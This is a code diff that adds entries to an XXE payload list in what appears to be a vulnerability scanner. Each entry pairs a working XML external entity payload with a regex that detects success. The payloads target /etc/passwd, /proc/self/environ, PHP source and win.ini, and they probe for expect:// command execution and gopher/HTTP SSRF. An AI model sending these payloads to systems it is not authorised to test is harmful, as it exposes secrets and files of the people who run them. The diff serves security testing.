@@ -28,6 +28,75 @@ XXE_PAYLOADS = [
     # billion laughs (DoS probe - safe mode: small, just detection)
     ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lollollollollollollollol">]><r>&lol;</r>',
      re.compile(r"lollollol"), "entity expansion reflected"),
+    # --- TECHNIQUE: Windows file disclosure ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
+     re.compile(r"\[fonts\]|\[extensions\]", re.I), "Windows win.ini disclosure"),
+    # --- TECHNIQUE: PHP filter wrapper (source disclosure) ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&xxe;</r>',
+     re.compile(r"PD9waH|base64", re.I), "php://filter wrapper probe"),
+    # --- TECHNIQUE: XInclude ---
+    ('<?xml version="1.0"?><r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></r>',
+     re.compile(r"root:x:0:0:"), "XInclude file disclosure"),
+    # --- TECHNIQUE: SVG-based XXE ---
+    ('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
+     re.compile(r"root:x:0:0:"), "SVG XXE file disclosure"),
+    # --- TECHNIQUE: external DTD ---
+    ('<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://127.0.0.1:9/evil.dtd"><r>test</r>',
+     re.compile(r"evil\.dtd|failed to load|external subset", re.I), "external DTD resolution"),
+    # --- TECHNIQUE: parameter entity with internal subset bypass ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p1 "<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>"> %p1;]><r>&xxe;</r>',
+     re.compile(r"root:x:0:0:"), "nested parameter entity disclosure"),
+    # --- TECHNIQUE: UTF-7 encoded XXE ---
+    ('<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE r [+ADwAIQ-DOCTYPE r [+ADwAIQ-ENTITY xxe SYSTEM "+ACI-file:///etc/passwd+ACIAPgBdAPg-+ADw-r+AD4-+ACY-xxe+ADsAPgAv-r+AD4-',
+     re.compile(r"root:x:0:0:"), "UTF-7 encoded XXE"),
+    # --- TECHNIQUE: expect:// (RCE-adjacent, safe probe) ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "expect://id">]><r>&xxe;</r>',
+     re.compile(r"uid=|gid=", re.I), "expect:// command execution probe"),
+    # --- TECHNIQUE: jar:// protocol ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "jar:file:///tmp/x.jar!/f">]><r>&xxe;</r>',
+     re.compile(r"jar:|failed to load external entity", re.I), "jar:// protocol probe"),
+    # --- TECHNIQUE: gopher:// (SSRF-adjacent) ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:9/_">]><r>&xxe;</r>',
+     re.compile(r"gopher|connection refused|failed to load", re.I), "gopher:// SSRF probe"),
+    # --- TECHNIQUE: quadratic blowup (DoS detection, small) ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "1234567890">]><r>&a;&a;&a;&a;&a;</r>',
+     re.compile(r"12345678901234567890"), "entity expansion (quadratic)"),
+    # --- TECHNIQUE: external entity in attribute ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><r a="&xxe;">x</r>',
+     re.compile(r"[a-z0-9-]{2,}", re.I), "entity in attribute value"),
+    # --- TECHNIQUE: DTD with encoding override ---
+    ('<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
+     re.compile(r"root:x:0:0:"), "encoding-override XXE"),
+    # --- TECHNIQUE: file disclosure via /proc ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><r>&xxe;</r>',
+     re.compile(r"PATH=|HOME=", re.I), "/proc/self/environ disclosure"),
+    # --- TECHNIQUE: blind XXE error channel ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///sx-blind-98765">]><r>&xxe;</r>',
+     re.compile(r"sx-blind-98765|could not|failed to", re.I), "blind XXE error channel"),
+    # --- TECHNIQUE: SOAP-style XXE ---
+    ('<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r></soap:Body></soap:Envelope>',
+     re.compile(r"root:x:0:0:"), "SOAP envelope XXE"),
+    # --- TECHNIQUE: RSS/Atom XXE ---
+    ('<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss><channel><title>&xxe;</title></channel></rss>',
+     re.compile(r"root:x:0:0:"), "RSS feed XXE"),
+    # --- TECHNIQUE: Office document XXE (OOXML) ---
+    ('<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><w:document>&xxe;</w:document>',
+     re.compile(r"root:x:0:0:"), "OOXML document XXE"),
+    # --- TECHNIQUE: DTD entity in notation ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!NOTATION n SYSTEM "file:///etc/passwd"><!ENTITY xxe SYSTEM "x" NDATA n>]><r>&xxe;</r>',
+     re.compile(r"notation|ndata|failed to load", re.I), "notation entity probe"),
+    # --- TECHNIQUE: external entity via HTTP ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://127.0.0.1:9/xxe">]><r>&xxe;</r>',
+     re.compile(r"connection refused|failed to load external entity", re.I), "HTTP external entity"),
+    # --- TECHNIQUE: file disclosure /etc/hosts ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><r>&xxe;</r>',
+     re.compile(r"localhost|127\.0\.0\.1", re.I), "/etc/hosts disclosure"),
+    # --- TECHNIQUE: CDATA-wrapped entity ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r><![CDATA[&xxe;]]></r>',
+     re.compile(r"root:x:0:0:"), "CDATA entity probe"),
+    # --- TECHNIQUE: double XXE (entity in entity) ---
+    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "xx"><!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&a;&xxe;</r>',
+     re.compile(r"root:x:0:0:"), "chained entity disclosure"),
 ]
 
 ERROR_SIGS = [
